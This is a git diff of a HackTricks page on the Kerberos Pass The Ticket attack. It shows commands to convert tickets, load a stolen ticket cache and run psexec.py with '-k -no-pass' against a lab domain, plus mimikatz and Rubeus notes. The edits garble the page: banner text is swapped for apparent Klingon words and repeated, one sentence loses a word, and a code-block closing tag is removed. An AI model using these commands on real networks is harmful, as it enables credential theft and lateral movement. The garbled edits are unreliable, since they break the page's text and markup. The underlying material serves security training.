@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>qaStaHvIS</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
@@ -35,7 +35,6 @@ In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authe
 ### **Swaping Linux and Windows tickets between platforms**
 
 The [**ticket_converter**](https://github.com/Zer1t0/ticket\_converter) tool converts ticket formats using just the ticket itself and an output file.
-
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -43,18 +42,15 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
-
-In Windows [Kekeo](https://github.com/gentilkiwi/kekeo) can be used.
+Windows [Kekeo](https://github.com/gentilkiwi/kekeo) can be used.
 
 ### Pass The Ticket Attack
 
 {% code title="Linux" %}
 ```bash
-export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
+export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
 ```
-{% endcode %}
-
 {% code title="Windows" %}
 ```bash
 #Load the ticket in memory using mimikatz or Rubeus
@@ -72,7 +68,7 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) qorwagh **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
